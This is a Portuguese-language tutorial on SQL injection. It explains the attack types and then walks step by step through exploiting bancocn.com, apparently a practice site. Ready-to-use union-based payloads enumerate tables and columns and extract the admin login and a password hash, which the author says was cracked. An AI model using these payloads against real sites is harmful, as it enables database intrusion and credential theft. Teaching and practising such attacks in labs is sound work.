# SQL Injection
## O SQL Injection é uma vulnerabilidade de segurança web que permite a um atacante interferir nas consultas (queries) que uma aplicação faz ao seu banco de dados. Ocorre quando dados fornecidos pelo usuário são inseridos de forma insegura em instruções SQL.  

### O que é SQL?
SQL é uma linguagem padrão para gerenciar e manipular bancos de dados relacionais, permitindo criar, ler, atualizar e deletar (CRUD) dados organizados em tabelas com linhas e colunas. Basicamente, é a linguagem utilizada para manipular bancos de dados.  
Alguns comandos importantes são:  

**SELECT** - Seleciona dados;  
**DELETE** - Deleta dados;  
**UPDATE** - Atualiza dados;  
**INSERT** - Insere dados;  
**WHERE** - Filtra dados;  
**ORDER BY** - Ordena dados por determinada coluna;  
**UNION** - Une vários "SELECT".  

### Tipos de SQL Injection
Podem existir alguns tipos:  

**Error-based**: mensagens de erro propositalmente causadas que retornam informações sobre o banco de dados, expondo informações sensíveis.  

**Union-based**: utiliza várias querys de SELECT, através do parâmetro UNION, para vazar informações do banco de dados.  
Exemplo: `' UNION SELECT username, password FROM users --`  

**Blind SQLi**: a informação não fica explícita para o atacante, sendo necessário "interrogar" o servidor. Alguns exemplos são:  
	**Boolean-based**: retorna em binário: verdadeiro ou falso;  
	Exemplo: `ID=1' AND (SELECT 1 FROM users WHERE name='admin')=1 --`  
	**Time-based**: o tempo de resposta do servidor é utilizado para inferir informações.  
	Exemplo: `ID=1' AND IF(1=1, SLEEP(5), 0) --`  

**Out-of-band SQLi**: Usada quando o servidor é "cego" e o tempo de resposta é instável. O atacante força o banco de dados a fazer uma requisição externa (DNS ou HTTP) para um servidor que ele controla.  

## Exemplo Prático
### Para exemplificar os conhecimentos, vamos explorar a falha no [bancocn.com](http://www.bancocn.com/).  

Analise a URL ao acessar as páginas de "Contato", "Empréstimos" e "História". Perceba que o parâmetro `?id=` altera conforme a página; mude o id para "4" e veja que nada será retornado, ou seja, cada página possui seu próprio ID. Seria uma consulta ao banco de dados? Coloque `?id=1'` (aspas simples no final) e veja o que acontece. O seguinte erro aparece:  
        You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1

Está sendo feita uma consulta direta no banco de dados, sem sanitização. Isso configura uma falha de SQL Injection, mas vamos ver que perigo isso oferece:  
Primeiramente, vamos ver quantas colunas há no banco de dados. Para isso, vamos usar o comando "GROUP BY" e algumas tentativas:
`cat.php?id=1 GROUP BY 1--`  
`cat.php?id=1 GROUP BY 2--`  
`cat.php?id=1 GROUP BY 3--`  
`cat.php?id=1 GROUP BY 4--` -> retorna erro

Logo, descobrimos que o banco de dados possui 3 colunas. Agora, vamos tentar realizar um ataque Union-based com as colunas:  
`cat.php?id=-1 UNION SELECT 1, 2, 3--`, perceba que nenhum erro foi retornado. Dessa forma, veja o que nos é retornado com os seguintes comandos:  
`cat.php?id=-1 UNION SELECT 1, 2, @@version--` -> 10.1.44-MariaDB-0ubuntu0.18.04.1  
`cat.php?id=-1 UNION SELECT 1, 2, database()--` -> bancocn  
`cat.php?id=-1 UNION SELECT 1, 2, user()--` -> bancocn@localhost  

Com apenas estes comandos, conseguimos a versão do banco de dados, nome e usuário.  
Note que o ID utilizado foi um número negativo, justamente para que somente o nosso SELECT seja válido.  
Agora, vamos explorar ainda mais a criticidade. Como o site está de fato realizando requisições diretas ao banco de dados, podemos aproveitar essa oportunidade para extrair informações sensíveis. Veja o seguinte comando:  
`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="bancocn"--` -> retorna o nome das tabelas;  
`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users"--` -> retorna o nome das colunas da tabela "users";  
`cat.php?id=-1 UNION SELECT 1,2, login from users--` -> retorna o usuário do banco de dados;  
`cat.php?id=-1 UNION SELECT 1,2, password from users--` -> retorna a senha do usuário (em hash);  

**Nota**: O GROUP_CONCAT é essencial em ataques manuais porque ele agrupa múltiplos resultados (como todas as tabelas) em uma única string na tela. Sem ele, o servidor mostraria apenas o primeiro resultado encontrado.

Após estes comandos, encontramos que:  
Usuário: admin  
Senha: 7b71be0e85318117d2e514ce2a2e222c -> senhafoda; a senha estava em hash MD5, mas utilizei ferramentas online (como o MD5 Decrypt) para fazer a quebra e encontrar a senha.

Assim, exploramos uma falha de SQL Injection e obtemos acesso às credenciais de acesso do administrador.


